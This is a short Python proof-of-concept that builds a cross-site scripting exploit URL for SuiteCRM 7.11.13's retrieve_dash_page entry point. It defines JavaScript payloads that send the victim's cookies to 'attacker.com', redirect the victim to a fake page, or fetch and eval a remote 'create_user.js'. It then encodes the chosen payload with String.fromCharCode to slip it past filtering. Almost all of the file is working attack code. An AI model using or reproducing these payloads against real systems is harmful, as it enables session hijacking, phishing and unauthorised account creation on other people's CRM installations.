__author__ = 'vuongdq'

URL_ATTACKER = 'http://attacker.com'
URL = 'http://mysite.com/SuiteCRM-7.11.13/index.php'

POC_STEAL_COOKIE = '''var xhr=new XMLHttpRequest(); xhr.open("GET", "%s?"+document.cookie, true); xhr.send();''' % URL_ATTACKER
POC_REDIRECT_URL = '''window.location.href="%s/js/fake.html";''' % URL_ATTACKER
POC_EXECUTE_FROM_URL = '''var xhr=new XMLHttpRequest();  xhr.open("GET", "%s/js/create_user.js", true); xhr.send(); xhr.onreadystatechange = (e) => {eval(xhr.responseText);}''' % URL_ATTACKER


PAYLOAD = '{0}?entryPoint=retrieve_dash_page&page_id=1;var res = String.fromCharCode({1});eval (res);//'

text = POC_EXECUTE_FROM_URL
result_arr = []
for i in range(len(text)):
    result_arr.append(str(ord(text[i])))
str_output = ','.join(result_arr)

print (PAYLOAD.format(URL,str_output))
